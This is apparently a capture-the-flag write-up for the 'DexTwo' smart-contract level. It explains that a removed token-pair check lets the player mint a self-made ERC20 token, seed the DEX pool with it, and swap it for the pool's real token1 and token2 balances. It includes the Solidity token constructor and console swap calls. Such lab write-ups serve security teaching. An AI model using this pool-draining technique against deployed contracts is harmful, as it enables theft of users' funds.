> You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

## 

The swap amount uses the same maths, and most of the code is the same as the previous challenge.

However, there is a subtle change:

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This check has been removed.

It means we swap from our own tokens.
This gives us control of the exchange rate:

```solidity
constructor(address dex, string memory name, string memory symbol, uint supply) ERC20(name, symbol) {
    _dex = dex;
    _mint(msg.sender, supply); // amount to swap
    _mint(dex, supply); // the pool has the same amount for the rate calculation
}
```

Since the player has the same amount as the "from" pool, he will swap for the full amount in the "to" pool:

```js
(await contract.balanceOf(await contract.token1(), player)).toNumber() // 10
await contract.swap('0x46375D8D95023f9562ED374997F2305910db7944', await contract.token1(), 1)
(await contract.balanceOf(await contract.token1(), player)).toNumber() // 110
```

And re-iterate on the second token to thoroughly empty the pools.
